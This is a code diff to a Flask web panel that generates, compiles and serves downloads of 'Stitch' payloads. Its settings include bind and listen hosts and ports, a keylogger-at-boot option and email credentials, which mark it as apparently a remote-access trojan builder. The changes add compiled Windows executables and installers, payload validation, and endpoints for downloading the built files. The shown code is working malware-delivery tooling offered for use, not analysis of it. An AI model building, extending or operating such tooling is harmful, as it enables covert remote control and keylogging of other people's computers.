@@ -787,10 +787,13 @@ def export_commands():
 @login_required
 @limiter.limit("5 per hour")  # Limit payload generation
 def generate_payload():
-    """Generate Stitch payload with specified configuration"""
+    """Generate Stitch payload with specified configuration - ENHANCED VERSION"""
     try:
         metrics_collector.increment_counter('api_requests')
         data = request.json or {}
+        
+        # Import payload utilities
+        from payload_utils import payload_manager, get_build_capabilities
         
         # Get configuration from request
         bind_host = data.get('bind_host', '')
@@ -799,6 +802,7 @@ def generate_payload():
         listen_port = data.get('listen_port', '4455')
         enable_bind = data.get('enable_bind', True)
         enable_listen = data.get('enable_listen', True)
+        create_installers = data.get('create_installers', False)
         
         # Validate inputs
         try:
@@ -808,6 +812,10 @@ def generate_payload():
                 raise ValueError("Invalid port range")
         except ValueError:
             return jsonify({'error': 'Invalid port numbers'}), 400
+        
+        # Check build capabilities
+        build_caps = get_build_capabilities()
+        log_debug(f"Build capabilities: {build_caps}", "INFO", "Payload")
         
         # Import payload generation
         from Application.stitch_gen import run_exe_gen
@@ -852,36 +860,106 @@ def generate_payload():
             stini.set_value('EMAIL_PWD', '')
             stini.set_value('KEYLOGGER_BOOT', 'False')
             
-            # Generate payload
-            run_exe_gen(auto_confirm=True, create_installers=False)
+            log_debug("Starting payload generation with full compilation", "INFO", "Payload")
             
-            # Find generated payload
-            payload_path = None
-            if os.path.exists('Configuration/st_main.py'):
-                payload_path = 'Configuration/st_main.py'
+            # Generate payload with full compilation
+            run_exe_gen(auto_confirm=True, create_installers=create_installers)
+            
+            # NEW: Find the actual compiled payload using our enhanced detection
+            latest_config_dir = payload_manager.get_latest_config_dir()
+            
+            if latest_config_dir:
+                log_debug(f"Found config directory: {latest_config_dir}", "INFO", "Payload")
                 
-                # Read the payload content
-                with open(payload_path, 'r') as f:
-                    payload_content = f.read()
+                # Detect all payload files
+                payload_files = payload_manager.detect_payload_files(latest_config_dir)
+                primary_payload = payload_manager.get_primary_payload(latest_config_dir)
                 
-                log_debug(f"Payload generated successfully: {len(payload_content)} bytes", "INFO", "Payload")
+                if primary_payload:
+                    # Validate the payload
+                    validation = payload_manager.validate_payload(primary_payload['path'])
+                    
+                    log_debug(f"Primary payload: {primary_payload['filename']} ({primary_payload['type']})", "INFO", "Payload")
+                    log_debug(f"Payload validation: {'✅ Valid' if validation['valid'] else '❌ Invalid'}", "INFO", "Payload")
+                    
+                    # Prepare response with comprehensive payload information
+                    response_data = {
+                        'success': True,
+                        'message': f'Payload generated successfully - {primary_payload["type"]}',
+                        'payload_info': {
+                            'filename': primary_payload['filename'],
+                            'type': primary_payload['type'],
+                            'size': primary_payload['size'],
+                            'created': primary_payload['created'],
+                            'path': primary_payload['path'],  # Internal use
+                            'valid': validation['valid']
+                        },
+                        'config': {
+                            'bind_host': bind_host,
+                            'bind_port': bind_port,
+                            'listen_host': listen_host,
+                            'listen_port': listen_port,
+                            'enable_bind': enable_bind,
+                            'enable_listen': enable_listen,
+                            'create_installers': create_installers
+                        },
+                        'build_capabilities': build_caps,
+                        'available_downloads': {
+                            'primary': '/api/download-payload-primary',
+                            'python_source': '/api/download-payload' if os.path.exists('Configuration/st_main.py') else None,
+                            'all_files': '/api/list-payload-files'
+                        },
+                        'payload_files_summary': {
+                            'executables': len(payload_files.get('executables', [])),
+                            'installers': len(payload_files.get('installers', [])),
+                            'python_source': len(payload_files.get('python_source', [])),
+                            'config_files': len(payload_files.get('config_files', []))
+                        }
+                    }
+                    
+                    # Add validation errors if any
+                    if validation['errors']:
+                        response_data['warnings'] = validation['errors']
+                    
+                    return jsonify(response_data)
                 
-                return jsonify({
-                    'success': True,
-                    'message': 'Payload generated successfully',
-                    'payload_size': len(payload_content),
-                    'config': {
-                        'bind_host': bind_host,
-                        'bind_port': bind_port,
-                        'listen_host': listen_host,
-                        'listen_port': listen_port,
-                        'enable_bind': enable_bind,
-                        'enable_listen': enable_listen
-                    },
-                    'download_url': '/api/download-payload'
-                })
+                else:
+                    # No primary payload found, fall back to Python source
+                    log_debug("No compiled payload found, checking for Python source", "WARNING", "Payload")
+                    
+                    if os.path.exists('Configuration/st_main.py'):
+                        with open('Configuration/st_main.py', 'r') as f:
+                            payload_content = f.read()
+                        
+                        return jsonify({
+                            'success': True,
+                            'message': 'Payload generated (Python source only - compilation may have failed)',
+                            'payload_info': {
+                                'filename': 'stitch_payload.py',
+                                'type': 'python_source',
+                                'size': len(payload_content),
+                                'created': datetime.now().isoformat(),
+                                'valid': 'SEC(INFO(' in payload_content
+                            },
+                            'config': {
+                                'bind_host': bind_host,
+                                'bind_port': bind_port,
+                                'listen_host': listen_host,
+                                'listen_port': listen_port,
+                                'enable_bind': enable_bind,
+                                'enable_listen': enable_listen
+                            },
+                            'build_capabilities': build_caps,
+                            'available_downloads': {
+                                'python_source': '/api/download-payload'
+                            },
+                            'warnings': ['Compilation failed - only Python source available', 
+                                       'Install PyInstaller or py2exe for executable generation']
+                        })
+                    else:
+                        return jsonify({'error': 'Payload generation failed - no output files found'}), 500
             else:
-                return jsonify({'error': 'Payload generation failed - no output file'}), 500
+                return jsonify({'error': 'Payload generation failed - no config directory created'}), 500
                 
         finally:
             # Restore backup config
@@ -890,6 +968,8 @@ def generate_payload():
         
     except Exception as e:
         log_debug(f"Payload generation error: {str(e)}", "ERROR", "Payload")
+        import traceback
+        log_debug(f"Full traceback: {traceback.format_exc()}", "ERROR", "Payload")
         return jsonify({'error': f'Payload generation failed: {str(e)}'}), 500
 
 
@@ -914,24 +994,243 @@ def configure_payload():
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
+@app.route('/api/build-capabilities')
+@login_required
+def get_build_capabilities_api():
+    """Get build capabilities and system information"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        from payload_utils import get_build_capabilities
+        
+        capabilities = get_build_capabilities()
+        
+        # Add additional system information
+        system_info = {
+            'platform': capabilities['platform'],
+            'python_version': f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}",
+            'architecture': platform.machine() if hasattr(platform, 'machine') else 'unknown'
+        }
+        
+        # Add recommendations
+        recommendations = []
+        if not capabilities['pyinstaller']:
+            recommendations.append({
+                'type': 'missing_tool',
+                'message': 'PyInstaller not installed - required for executable generation',
+                'action': 'Install with: pip install pyinstaller'
+            })
+        
+        if capabilities['platform'].startswith('win') and not capabilities['py2exe']:
+            recommendations.append({
+                'type': 'missing_tool',
+                'message': 'py2exe not installed - alternative to PyInstaller for Windows',
+                'action': 'Install with: pip install py2exe'
+            })
+        
+        if capabilities['platform'].startswith('win') and not capabilities['nsis']:
+            recommendations.append({
+                'type': 'missing_tool',
+                'message': 'NSIS not installed - required for Windows installers',
+                'action': 'Download from: http://nsis.sourceforge.net/Download'
+            })
+        
+        return jsonify({
+            'success': True,
+            'capabilities': capabilities,
+            'system_info': system_info,
+            'recommendations': recommendations,
+            'can_build_executables': capabilities['pyinstaller'] or capabilities['py2exe'],
+            'can_build_installers': capabilities['nsis'] or capabilities['makeself']
+        })
+        
+    except Exception as e:
+        log_debug(f"Error getting build capabilities: {str(e)}", "ERROR", "System")
+        return jsonify({'error': str(e)}), 500
+
 @app.route('/api/download-payload')
 @login_required
 def download_payload():
-    """Download the generated payload"""
+    """Download the Python source payload (legacy endpoint)"""
     try:
         metrics_collector.increment_counter('api_requests')
         payload_path = 'Configuration/st_main.py'
         
         if os.path.exists(payload_path):
-            log_debug("Payload downloaded", "INFO", "Payload")
+            log_debug("Python payload downloaded", "INFO", "Payload")
             return send_file(payload_path, 
                            as_attachment=True, 
                            download_name='stitch_payload.py',
                            mimetype='text/x-python')
         else:
-            return jsonify({'error': 'No payload available for download'}), 404
+            return jsonify({'error': 'No Python payload available for download'}), 404
             
     except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/download-payload-primary')
+@login_required
+def download_payload_primary():
+    """Download the primary payload (executable preferred, fallback to Python)"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        from payload_utils import payload_manager
+        
+        # Get the latest config directory
+        latest_config_dir = payload_manager.get_latest_config_dir()
+        
+        if not latest_config_dir:
+            return jsonify({'error': 'No payload config directory found'}), 404
+        
+        # Get the primary payload
+        primary_payload = payload_manager.get_primary_payload(latest_config_dir)
+        
+        if not primary_payload:
+            return jsonify({'error': 'No primary payload found'}), 404
+        
+        payload_path = primary_payload['path']
+        
+        if not os.path.exists(payload_path):
+            return jsonify({'error': 'Primary payload file not found'}), 404
+        
+        # Validate the payload
+        validation = payload_manager.validate_payload(payload_path)
+        if not validation['valid']:
+            log_debug(f"Warning: Downloading potentially invalid payload: {validation['errors']}", "WARNING", "Payload")
+        
+        # Determine MIME type based on file type
+        mime_type = 'application/octet-stream'  # Default for executables
+        if primary_payload['type'] == 'python_source':
+            mime_type = 'text/x-python'
+        elif primary_payload['type'] == 'windows_executable':
+            mime_type = 'application/x-msdownload'
+        elif primary_payload['type'] == 'makeself_installer':
+            mime_type = 'application/x-sh'
+        
+        log_debug(f"Primary payload downloaded: {primary_payload['filename']} ({primary_payload['type']})", "INFO", "Payload")
+        
+        return send_file(payload_path, 
+                       as_attachment=True, 
+                       download_name=primary_payload['filename'],
+                       mimetype=mime_type)
+        
+    except Exception as e:
+        log_debug(f"Error downloading primary payload: {str(e)}", "ERROR", "Payload")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/list-payload-files')
+@login_required
+def list_payload_files():
+    """List all available payload files from the latest generation"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        from payload_utils import payload_manager
+        
+        # Get the latest config directory
+        latest_config_dir = payload_manager.get_latest_config_dir()
+        
+        if not latest_config_dir:
+            return jsonify({'error': 'No payload config directory found'}), 404
+        
+        # Get all payload files
+        payload_files = payload_manager.detect_payload_files(latest_config_dir)
+        
+        # Format the response
+        file_list = []
+        
+        for file_type, files in payload_files.items():
+            for file_path in files:
+                if os.path.exists(file_path):
+                    file_info = {
+                        'filename': os.path.basename(file_path),
+                        'type': file_type,
+                        'size': os.path.getsize(file_path),
+                        'path': file_path,  # Internal use
+                        'download_url': f'/api/download-payload-file?file={os.path.basename(file_path)}&type={file_type}',
+                        'created': datetime.fromtimestamp(os.path.getctime(file_path)).isoformat()
+                    }
+                    
+                    # Add validation info
+                    validation = payload_manager.validate_payload(file_path)
+                    file_info['valid'] = validation['valid']
+                    if validation['errors']:
+                        file_info['warnings'] = validation['errors']
+                    
+                    file_list.append(file_info)
+        
+        # Sort by type priority and then by name
+        type_priority = {'executables': 1, 'installers': 2, 'python_source': 3, 'config_files': 4}
+        file_list.sort(key=lambda x: (type_priority.get(x['type'], 5), x['filename']))
+        
+        return jsonify({
+            'success': True,
+            'config_directory': latest_config_dir,
+            'total_files': len(file_list),
+            'files': file_list,
+            'summary': {
+                'executables': len(payload_files.get('executables', [])),
+                'installers': len(payload_files.get('installers', [])),
+                'python_source': len(payload_files.get('python_source', [])),
+                'config_files': len(payload_files.get('config_files', []))
+            }
+        })
+        
+    except Exception as e:
+        log_debug(f"Error listing payload files: {str(e)}", "ERROR", "Payload")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/download-payload-file')
+@login_required
+def download_payload_file():
+    """Download a specific payload file by name and type"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        from payload_utils import payload_manager
+        
+        filename = request.args.get('file')
+        file_type = request.args.get('type')
+        
+        if not filename or not file_type:
+            return jsonify({'error': 'Missing file or type parameter'}), 400
+        
+        # Get the latest config directory
+        latest_config_dir = payload_manager.get_latest_config_dir()
+        
+        if not latest_config_dir:
+            return jsonify({'error': 'No payload config directory found'}), 404
+        
+        # Get all payload files
+        payload_files = payload_manager.detect_payload_files(latest_config_dir)
+        
+        # Find the requested file
+        target_file = None
+        for file_path in payload_files.get(file_type, []):
+            if os.path.basename(file_path) == filename:
+                target_file = file_path
+                break
+        
+        if not target_file or not os.path.exists(target_file):
+            return jsonify({'error': f'File {filename} of type {file_type} not found'}), 404
+        
+        # Determine MIME type
+        mime_type = 'application/octet-stream'
+        if file_type == 'python_source':
+            mime_type = 'text/x-python'
+        elif file_type == 'config_files':
+            mime_type = 'text/plain'
+        elif filename.endswith('.exe'):
+            mime_type = 'application/x-msdownload'
+        elif filename.endswith('.run'):
+            mime_type = 'application/x-sh'
+        
+        log_debug(f"Specific payload file downloaded: {filename} ({file_type})", "INFO", "Payload")
+        
+        return send_file(target_file, 
+                       as_attachment=True, 
+                       download_name=filename,
+                       mimetype=mime_type)
+        
+    except Exception as e:
+        log_debug(f"Error downloading specific payload file: {str(e)}", "ERROR", "Payload")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/upload', methods=['POST'])
